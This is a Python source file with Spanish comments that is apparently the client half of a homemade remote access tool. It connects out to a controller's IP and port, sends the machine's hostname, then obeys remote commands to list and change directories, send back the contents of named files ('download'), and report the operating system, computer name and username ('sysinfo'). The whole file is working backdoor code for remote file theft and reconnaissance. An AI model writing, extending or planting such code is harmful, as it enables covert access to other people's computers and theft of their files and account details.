import socket
import platform
import os
import getpass

from config import SIZE_RECV

def connect_to_server(static_ip,port):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_address = (static_ip,port)

    client.connect(server_address)

    # comprobar si se ha conectado el socket para poder enviar este mensaje
    message = socket.gethostname() 
    client.send(message.encode())


def connected_to_server(socket_client):
    # conoprobar si el socket tiene una conexion definida
    while True:
        try:
            cmd = socket_client.recv(SIZE_RECV).decode("utf-8")
            if cmd == "ls":
                #ESTE IGUAL FUNCIONO PERO QUIERO NAVEGAR POR EL DIRECTORIO NO NAVEGAR CON NA LISTA
                socket_client.send(str(os.listdir(".")).encode())
                

                # ESTE SI FUNCIONO PERO NO ME GUSTO COMO MOSTRABA LOS DATOS
                #info = subprocess.run(args="dir",shell=True,capture_output = True)
                #message = str(info.stdout)
                #sock_client.send(message.encode())

                '''
                # posible codigo para mejorar pero tiene errores 
                p1 = subprocess.Popen('dir', shell=True, stdin=None,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                p2 = subprocess.Popen('sort /R', shell=True, stdin=p1.stdout)
                message = str(p1.stdout).decode()
                p1.stdout.close()
                out, err = p2.communicate()
                
                sock_client.send(message.encode())
                '''
            elif cmd.split(" ")[0] == "download":
                # cuando estoy guardando debo poder guarda run archivo en este caso 

                file_name = cmd.split(" ")[1:]
                listToStr = ' '.join([str(elem) for elem in file_name])
                print(listToStr)
                with open(listToStr, "r") as f:
                    #print(os.listdir(os.getcwd()))
                    archive = open(os.getcwd() + "/" + listToStr, "r")
                    for data in archive:
                        print(data)
                        socket_client.send(data.encode())        
                
            elif cmd.split(" ")[0] == "cd":
                if cmd.split(" ")[1] == "..":
                    os.chdir("..")
                    socket_client.send(os.getcwd().encode())
                else:
                    os.chdir(cmd.split(" ")[1])
                    socket_client.send(os.getcwd().encode())

            elif cmd == "sysinfo":

                sysinfo = f"""
                Operating System: {platform.system()}
                Computer Name: {platform.node()}
                Username: {getpass.getuser()}
                Release Version: {platform.release()}
                Processor Architecture: {platform.processor()}
                           """
                socket_client.send(sysinfo.encode())
            elif cmd == "exit":
                    break
            else:
                error_message = "Error al ejecutar comando".encode()
                socket_client.send(error_message)
        except Exception as e:
            socket_client.send(f"Error ocurrido: {str(e)}".encode())
    socket_client.close()
